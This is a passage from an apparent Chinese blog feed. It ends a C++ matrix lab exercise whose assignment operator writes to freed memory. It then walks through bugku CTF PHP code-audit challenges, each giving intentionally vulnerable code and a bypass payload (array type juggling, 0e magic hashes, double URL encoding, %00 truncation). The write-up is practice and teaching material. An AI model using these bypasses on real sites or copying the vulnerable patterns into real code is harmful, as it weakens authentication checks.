class="keyword">const</span> Matrix &amp;B);</span><br><span class="line"></span><br><span class="line">    Matrix &amp; <span class="keyword">operator</span> = (<span class="keyword">const</span> Matrix &amp;B)</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span>((<span class="keyword">this</span>-&gt;row==<span class="number">0</span>)&amp;&amp;(<span class="keyword">this</span>-&gt;col==<span class="number">0</span>))<span class="comment">//用来判断cm=am+bm这种情形 </span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;row=B.row;</span><br><span class="line"><span class="keyword">this</span>-&gt;col=B.col;</span><br><span class="line">m= <span class="keyword">new</span> <span class="keyword">int</span>[row*col];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;(B.row*B.col);i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;m[i]=B.m[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(((<span class="keyword">this</span>-&gt;row==B.row)&amp;&amp;(<span class="keyword">this</span>-&gt;col==B.col)))<span class="comment">//判断am=bm这种情形 </span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span> [] m;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;(B.row*B.col);i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;m[i]=B.m[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"program terminated!"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Matrix <span class="keyword">operator</span> +(<span class="keyword">const</span> Matrix&amp; A,<span class="keyword">const</span> Matrix&amp; B)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">Matrix C;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((A.row==B.row)&amp;&amp;(A.col==B.col))</span><br><span class="line">&#123;</span><br><span class="line">C.row=A.row;</span><br><span class="line">C.col=A.col;</span><br><span class="line">C.m=<span class="keyword">new</span> <span class="keyword">int</span>[(C.row*C.col)];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;(A.row*A.col);i++)</span><br><span class="line">&#123;</span><br><span class="line">C.m[i]=A.m[i]+B.m[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"program terminated!"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> row_a,col_a,row_b,col_b;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入am矩阵的行数和列数:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;row_a&gt;&gt;col_a;</span><br><span class="line"><span class="function">Matrix <span class="title">am</span><span class="params">(row_a,col_a)</span></span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入bm矩阵的行数和列数:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;row_b&gt;&gt;col_b;</span><br><span class="line">Matrix bm(row_b,col_b),cm;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"am:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">am.disp();</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"bm:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">bm.disp();</span><br><span class="line">cm=am+bm;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"cm=am+bm:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">cm.disp();</span><br><span class="line">am=bm;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"am=bm:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">am.disp();</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;南邮关于c-多态性的上机题，写的时候还是遇到了很多问题的。&quot;&gt;&lt;a href=&quot;#南邮关于c-多态性的上机题，写的时候还是遇到了很多问题的。&quot; class=&quot;headerlink&quot; title=&quot;南邮关于c++多态性的上机题，写的时候还是遇到了很多问题的。&quot;&gt;&lt;/a&gt;南邮关于c++多态性的上机题，写的时候还是遇到了很多问题的。&lt;/h1&gt;&lt;h2 id=&quot;1&quot;&gt;&lt;a href=&quot;#1&quot; class=&quot;headerlink&quot; title=&quot;1&quot;&gt;&lt;/a&gt;1&lt;/h2&gt;&lt;p&gt;定义复数类Complex，有实部、虚部两个私有成员变量，在该类中定义多个重载的构造函数、定义析构函数和输出函数print，复数的输出形如12-3i，在类中重载+、−、*、/、++（分前++和后++）。在主函数（直接用实验教材P210代码）中定义复数类的对象，实现复数的各种算术运算，通过重载实现静态多态性。&lt;br&gt;
    
    </summary>
    
    
      <category term="c++" scheme="http://chenxiyuan.vip/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>简单的代码审计</title>
    <link href="http://chenxiyuan.vip/2019/04/25/%E7%AE%80%E5%8D%95%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>http://chenxiyuan.vip/2019/04/25/简单的代码审计/</id>
    <published>2019-04-25T11:27:08.000Z</published>
    <updated>2019-07-13T05:58:33.068Z</updated>
    
    <content type="html"><![CDATA[<h1 id="bugku里一些简单的代码审计题"><a href="#bugku里一些简单的代码审计题" class="headerlink" title="bugku里一些简单的代码审计题"></a>bugku里一些简单的代码审计题</h1><h2 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h2><p><a href="http://123.206.87.240:9009/1.php" target="_blank" rel="noopener">http://123.206.87.240:9009/1.php</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">'xxx'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($shiyan))</span><br><span class="line">&#123;</span><br><span class="line">$content=trim(file_get_contents($flag));</span><br><span class="line"><span class="keyword">if</span>($shiyan==$content)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">'flag&#123;xxx&#125;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">'Oh.no'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>首先extract函数用来将变量从数组中导入到当前的符号表中。这里要让$shiyan==$content,那么只要给$flag和$shiyan变量同时传入空值即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:shiyan=&amp;flag=</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="strcmp比较字符串"><a href="#strcmp比较字符串" class="headerlink" title="strcmp比较字符串"></a>strcmp比较字符串</h2><p><a href="http://123.206.87.240:9009/6.php" target="_blank" rel="noopener">http://123.206.87.240:9009/6.php</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag&#123;xxxxx&#125;"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (strcmp($_GET[<span class="string">'a'</span>], $flag) == <span class="number">0</span>) <span class="comment">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span></span><br><span class="line"><span class="comment">//比较两个字符串（区分大小写）</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'No'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>在5.3之前的php中,strcmp()在比较字符串和数组的时候直接返回0，这样通过把目标变量设置成数组就可以绕过该函数的限制.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:a[]=1</span><br></pre></td></tr></table></figure><h2 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a>urldecode二次编码绕过</h2><p><a href="http://123.206.87.240:9009/10.php" target="_blank" rel="noopener">http://123.206.87.240:9009/10.php</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,$_GET[id])) &#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">not allowed!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"hackerDJ"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"</span></span><br><span class="line"><span class="string">Access granted!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"</span></span><br><span class="line"><span class="string">flag</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>(PHP 4, PHP 5)eregi函数以不区分大小写的正则表达式匹配，我们只要利用两次urldecode第一次是浏览器的解码第二次是函数的解码，就可以绕过了。这里只对其中一个字符D编码两次就行了，由于D的ascii码16进制值为0x44，所以第一次urlencode是%44，第二次%2544。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:id=hacker%2544J</span><br></pre></td></tr></table></figure></p><h2 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5()函数"></a>md5()函数</h2><p><a href="http://123.206.87.240:9009/18.php" target="_blank" rel="noopener">http://123.206.87.240:9009/18.php</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'username'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Your password can not be your username.'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (md5($_GET[<span class="string">'username'</span>]) === md5($_GET[<span class="string">'password'</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>这是一道很经典的题了，两变量值不等MD5值相等，利用MD5对数组返回NULL，即可绕过。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:username[]=1&amp;password[]=2</span><br></pre></td></tr></table></figure></p><h2 id="数组返回NULL绕过"><a href="#数组返回NULL绕过" class="headerlink" title="数组返回NULL绕过"></a>数组返回NULL绕过</h2><p><a href="http://123.206.87.240:9009/19.php" target="_blank" rel="noopener">http://123.206.87.240:9009/19.php</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'You password must be alphanumeric'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'--'</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>看到题目就知道要，传数组进去了，两次返回都是NULL，不等于FALSE绕过成功。<br>还有可以正常利用ereg遇到%00就截止来绕过。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: password[]=1或password=a%00--</span><br></pre></td></tr></table></figure></p><h2 id="弱类型整数大小比较绕过"><a href="#弱类型整数大小比较绕过" class="headerlink" title="弱类型整数大小比较绕过"></a>弱类型整数大小比较绕过</h2><p><a href="http://123.206.87.240:9009/22.php" target="_blank" rel="noopener">http://123.206.87.240:9009/22.php</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$temp = $_GET[<span class="string">'password'</span>];</span><br><span class="line">is_numeric($temp)?<span class="keyword">die</span>(<span class="string">"no numeric"</span>):<span class="keyword">NULL</span>;</span><br><span class="line"><span class="keyword">if</span>($temp&gt;<span class="number">1336</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br></pre></td></tr></table></figure></p><p>is_numeric() 函数用于检测变量是否为数字或数字字符串。可以用数组绕过，也可以在数字后跟任意符号或文本绕过。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: password[]=1或password=1367$</span><br></pre></td></tr></table></figure></p><h2 id="sha-函数比较绕过"><a href="#sha-函数比较绕过" class="headerlink" title="sha()函数比较绕过"></a>sha()函数比较绕过</h2><p><a href="http://123.206.87.240:9009/7.php" target="_blank" rel="noopener">http://123.206.87.240:9009/7.php</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">var_dump($_GET[<span class="string">'name'</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"</span></span><br><span class="line"><span class="string">"</span>;</span><br><span class="line">var_dump($_GET[<span class="string">'password'</span>]);</span><br><span class="line">var_dump(sha1($_GET[<span class="string">'name'</span>]));</span><br><span class="line">var_dump(sha1($_GET[<span class="string">'password'</span>]));</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your password can not be your name!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string">Invalid password.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string">Login first!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>数组绕过,sha1()函数无法处理数组类型，将报错并返回NULL，if 条件成立，获得flag。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: name[]=1&amp;password[]=2</span><br></pre></td></tr></table></figure></p><h2 id="md5加密相等绕过"><a href="#md5加密相等绕过" class="headerlink" title="md5加密相等绕过"></a>md5加密相等绕过</h2><p><a href="http://123.206.87.240:9009/13.php" target="_blank" rel="noopener">http://123.206.87.240:9009/13.php</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$md51 = md5(<span class="string">'QNKCDZO'</span>);</span><br><span class="line">$a = @$_GET[<span class="string">'a'</span>];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span><br><span class="line"><span class="keyword">if</span> ($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag&#123;*&#125;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"false!!!"</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">"please input a"</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>由于php对数据的处理问题，当它读到0exxx的时候会当做科学计数法来处理。无论0e后面是什么，0的多少次方还是0.<br>md5(QNKCDZO)=0e830400451993494058024219903391<br>md5(240610708)=0e462097431906509019562988736854<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: a=240610708</span><br></pre></td></tr></table></figure></p><h2 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a>十六进制与数字比较</h2><p><a href="http://123.206.87.240:9009/20.php" target="_blank" rel="noopener">http://123.206.87.240:9009/20.php</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($temp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$flag = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line">$one = ord(<span class="string">'1'</span>); <span class="comment">//ord — 返回字符的 ASCII 码值</span></span><br><span class="line">$nine = ord(<span class="string">'9'</span>); <span class="comment">//ord — 返回字符的 ASCII 码值</span></span><br><span class="line">$number = <span class="string">'3735929054'</span>;</span><br><span class="line"><span class="comment">// Check all the input characters!</span></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Disallow all the digits!</span></span><br><span class="line">$digit = ord($temp&#123;$i&#125;);</span><br><span class="line"><span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Aha, digit not allowed!</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">"flase"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($number == $temp)</span><br><span class="line"><span class="keyword">return</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">$temp = $_GET[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">echo</span> noother_says_correct($temp);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>根据题目提示，把3735929054转为16进制0xdeadc0de，发现刚好绕过。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: password=0xdeadc0de</span><br></pre></td></tr></table></figure></p><h2 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h2><p><a href="http://123.206.87.240:9009/5.php" target="_blank" rel="noopener">http://123.206.87.240:9009/5.php</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"xxx"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">You password must be alphanumeric</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'password'</span>]) &lt; <span class="number">8</span> &amp;&amp; $_GET[<span class="string">'password'</span>] &gt; <span class="number">9999999</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'*-*'</span>) !== <span class="keyword">FALSE</span>) <span class="comment">//strpos — 查找字符串首次出现的位置</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">'</span></span><br><span class="line"><span class="string">- have not been found</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string">Invalid password</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>科学计数法+%00截断绕过ereg,%00算一个字符。还有就是数组也可以绕过。。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: password=1e9%00*-* 或password[]=1</span><br></pre></td></tr></table></figure></p><h2 id="strpos数组绕过"><a href="#strpos数组绕过" class="headerlink" title="strpos数组绕过"></a>strpos数组绕过</h2><p><a href="http://123.206.87.240:9009/15.php" target="_blank" rel="noopener">http://123.206.87.240:9009/15.php</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'ctf'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, $_GET[<span class="string">'ctf'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'必须输入数字才行'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'ctf'</span>], <span 